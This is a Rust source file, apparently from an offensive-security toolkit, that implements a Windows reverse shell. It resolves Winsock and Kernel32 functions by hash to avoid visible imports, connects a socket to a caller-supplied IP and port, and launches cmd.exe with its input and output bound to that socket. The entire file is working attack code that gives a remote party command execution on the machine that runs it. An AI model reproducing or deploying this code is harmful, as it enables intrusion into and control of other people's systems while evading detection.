use std::ffi::{c_void, CStr};
use std::{mem, ptr};
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Networking::WinSock::{
    AF_INET, IPPROTO_TCP, SOCKADDR, SOCKADDR_IN, SOCKET, SOCK_STREAM, WSADATA, WSAPROTOCOL_INFOA,
};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Threading::{
    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
};

// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms632663(v=vs.85)
// Normally this is called by MAKEWORD(2,2), which is 514
const WSASTARTUPVAL: u16 = 514;

pub fn shell(ip: &str, port: u16) {
    // Get location of Ws2_32.dll
    let ws2_32 = rco_utils::find_library_address("Ws2_32").unwrap();

    // See line 15
    let function = rco_utils::find_function_address(ws2_32, 0xedf45b56dba24418).unwrap();
    let function = rco_utils::construct_win32_function!(function; [u16, &mut WSADATA]; [()]);
    unsafe { function(WSASTARTUPVAL, &mut WSADATA::default()) };

    // See line 28
    let function = rco_utils::find_function_address(ws2_32, 0xad51563d572a6798).unwrap();
    let function = rco_utils::construct_win32_function!(function; [i32, i32, i32, *const WSAPROTOCOL_INFOA, i32, i32]; [SOCKET]);
    let socket = unsafe {
        function(
            AF_INET.0.into(),
            SOCK_STREAM.0,
            IPPROTO_TCP.0,
            ptr::null(),
            0,
            0,
        )
    };

    // See line 42
    let function = rco_utils::find_function_address(ws2_32, 0xf6d69fad519d46a0).unwrap();
    let mut sockaddr_in = SOCKADDR_IN {
        sin_family: AF_INET,
        ..Default::default()
    };
    let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
    let ip_pcstr = PCSTR::from_raw(format!("{ip}\0").as_mut_ptr());
    let function = rco_utils::construct_win32_function!(function; [i32, PCSTR, *mut c_void]; [i32]);
    unsafe { function(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr) };

    // See line 68
    let function = rco_utils::find_function_address(ws2_32, 0x57420f0d05112fd1).unwrap();
    let function = rco_utils::construct_win32_function!(function; [u16]; [u16]);
    sockaddr_in.sin_port = unsafe { function(port) };

    // See line 77
    let function = rco_utils::find_function_address(ws2_32, 0xcbfa974b4e43f414).unwrap();
    let function =
        rco_utils::construct_win32_function!(function; [SOCKET, *const SOCKADDR, i32]; [i32]);
    unsafe {
        function(
            socket,
            &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
            mem::size_of::<SOCKADDR_IN>() as i32,
        )
    };

    // Get location of Ws2_32.dll
    let kernel32 = rco_utils::find_library_address("Kernel32").unwrap();

    // See line 91
    let function = rco_utils::find_function_address(kernel32, 0x9822936f60f9a914).unwrap();
    let lp_buffer: &mut [u8] = &mut [0; 50];
    let function = rco_utils::construct_win32_function!(function; [&mut [u8]]; [()]);
    unsafe { function(lp_buffer) };
    let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
    let system_dir = system_dir.to_str().unwrap();

    // See line 103
    let function = rco_utils::find_function_address(kernel32, 0x6fe222ff0e96f5c4).unwrap();
    let mut startup_info = STARTUPINFOA {
        cb: mem::size_of::<STARTUPINFOA>() as u32,
        dwFlags: STARTF_USESTDHANDLES,
        ..Default::default()
    };

    let sock_handle = &socket as *const SOCKET as *const HANDLE;
    startup_info.hStdInput = unsafe { *sock_handle };
    startup_info.hStdOutput = unsafe { *sock_handle };
    startup_info.hStdError = unsafe { *sock_handle };
    let lp_command_line = PSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [i32]);
    unsafe {
        let _ = function(
            PCSTR::null(),
            lp_command_line,
            &SECURITY_ATTRIBUTES::default(),
            &SECURITY_ATTRIBUTES::default(),
            true,
            PROCESS_CREATION_FLAGS::default(),
            ptr::null(),
            PCSTR::null(),
            &startup_info,
            &PROCESS_INFORMATION::default(),
        );
    };
}
